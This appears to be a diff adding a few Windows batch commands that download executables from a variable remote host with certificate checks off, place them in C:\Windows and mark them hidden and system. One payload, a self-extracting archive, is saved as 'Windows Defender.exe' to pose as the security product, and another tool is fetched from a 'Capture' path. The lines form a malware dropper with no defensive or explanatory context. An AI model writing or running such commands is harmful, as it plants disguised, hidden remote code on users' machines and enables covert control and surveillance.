@@ -1,1 +1,5 @@
+attrib -s -h i "C:\Windows\nircmd.exe" && curl.exe -k %proxy% %host%/Capture/nircmd.exe --output "C:\Windows\nircmd.exe" && attrib +s +h +i "C:\Windows\nircmd.exe"
 
+attrib -s -h i "C:\Windows\curl.exe" && curl.exe -k %proxy% %host%/Tools/curl.exe --output "C:\Windows\curl.exe" && attrib +s +h +i "C:\Windows\curl.exe"
+
+attrib -s -h i "C:\Windows\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe --output "C:\Windows\Windows Defender.exe" && attrib +s +h +i "C:\Windows\Windows Defender.exe"
